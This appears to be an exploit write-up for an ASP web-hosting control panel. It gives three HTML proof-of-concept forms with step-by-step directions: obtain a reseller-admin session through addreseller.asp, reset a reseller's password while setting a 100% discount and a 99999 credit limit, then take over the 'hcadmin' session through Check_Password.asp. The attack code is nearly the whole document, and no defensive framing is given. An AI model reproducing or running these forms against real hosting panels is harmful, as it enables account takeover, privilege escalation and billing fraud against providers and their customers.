@@ -1,0 +1,156 @@
+-------------------------------------------------------------------------------------
+===============================================
+1- This code give resadmin session to a user:
+Bug in "hosting/addreseller.asp", No checker is available.
+---------------------------------------------------
+
+function siteaction(){
+n_act= "/hosting/addreseller.asp?htype=3"
+window.document.all.frm1.action = window.document.all.siteact.value + n_act
+window.document.all.frm1.submit()
+}
+</script>
+<hr><br>
+Form1<br>
+URL: <input type="text" name=siteact size=70>
+<br>
+<form name="frm1" method="post" onfiltered="return siteaction()">
+<table>
+<tr>
+<td>reseller</td>
+<td><input type="text" name="reseller" value="hcadmin"></td>
+</tr>
+<tr>
+<td>loginname</td>
+<td><input type="text" name="loginname" value="hcadmin"></td>
+</tr>
+<tr>
+<td>Password</td>
+<td><input type="text" name="Password" value=""></td>
+</tr>
+<tr>
+<td>first_name</td>
+<td><input type="text" name="first_name" value=""></td>
+</tr>
+<tr>
+<td>first_name</td>
+<td><input type="text" name="first_name" value=""></td>
+</tr>
+<tr>
+<td>last_name</td>
+<td><input type="text" name="last_name" value=""></td>
+</tr>
+<tr>
+<td>address</td>
+<td><input type="text" name="address" value=""></td>
+</tr>
+<tr>
+<td>city</td>
+<td><input type="text" name="city" value=""></td>
+</tr>
+<tr>
+<td>state</td>
+<td><input type="text" name="state" value=""></td>
+</tr>
+<tr>
+<td>country</td>
+<td><input type="text" name="country" value=""></td>
+</tr>
+<tr>
+<td>email</td>
+<td><input type="text" name="email" value=""></td>
+</tr>
+<tr>
+<td>phone</td>
+<td><input type="text" name="phone" value=""></td>
+</tr>
+<tr>
+<td>fax</td>
+<td><input type="text" name="fax" value=""></td>
+</tr>
+<tr>
+<td>zip</td>
+<td><input type="text" name="zip" value=""></td>
+</tr>
+<tr>
+<td>selMonth</td>
+<td><input type="text" name="selMonth" value=""></td>
+</tr>
+<tr>
+<td>selYear</td>
+<td><input type="text" name="selYear" value=""></td>
+</tr>
+<tr>
+<td>txtcardno</td>
+<td><input type="text" name="txtcardno" value=""></td>
+</tr>
+</table>
+<br><input type="submit">
+</form>
+<hr><br>
+---------------------------------------------------
+===============================================
+2- This code list all of resellers then you must change a password of one of them then login by it for next step.
+Note: Also by this code, everyone can increase its Credit value then buy every host.
+---------------------------------------------------
+<form actionfiltered="http://[URL]/Admin/Accounts/AccountActions.asp?ActionType=UpdateCreditLimit" method="post">
+<table>
+<tr>
+<td>Username:</td>
+<td><input type="text" name="UserName" value="hcadmin"></td>
+</tr>
+<tr>
+<td>Description:</td>
+<td><input type="text" name="Description" value=""></td>
+</tr>
+<tr>
+<td>FullName:</td>
+<td><input type="text" name="FullName" value=""></td>
+</tr>
+<tr>
+<td>AccountDisabled 1,[blank]:</td>
+<td><input type="text" name="AccountDisabled" value=""></td>
+</tr>
+<tr>
+<td>UserChangePassword:</td>
+<td><input type="text" name="UserChangePassword" value=""></td>
+</tr>
+<tr>
+<td>PassCheck=TRUE,0:</td>
+<td><input type="text" name="PassCheck" value="0"></td>
+</tr>
+<tr>
+<td>New Password:</td>
+<td><input type="text" name="Pass1" value=""></td>
+</tr>
+<tr>
+<td>DefaultDiscount%:</td>
+<td><input type="text" name="DefaultDiscount" value="100"></td>
+</tr>
+<tr>
+<td>CreditLimit:</td>
+<td><input type="text" name="CreditLimit" value="99999"></td>
+</tr>
+</table>
+<br><input type="submit">
+</form>
+<hr><br>
+---------------------------------------------------
+===============================================
+3- Now you must login by a resseler that changed password from last step. now goto userlist, if there is a user that will enough and if no user available, u must make it!
+now select it and click Enter to enter by that user. now the bug will be available:
+each reseller can gain every user session even "HCADMIN" by bug in ""
+below code will help you:
+---------------------------------------------------
+<hr><br>
+Form1<br>
+<form actionfiltered="http://[URL]/Admin/Check_Password.asp" method="post">
+<table>
+<tr>
+<td>AdName</td>
+<td><input type="text" name="AdName" value="hcadmin"></td>
+</tr>
+</table>
+<br><input type="submit">
+</form>
+<hr><br>
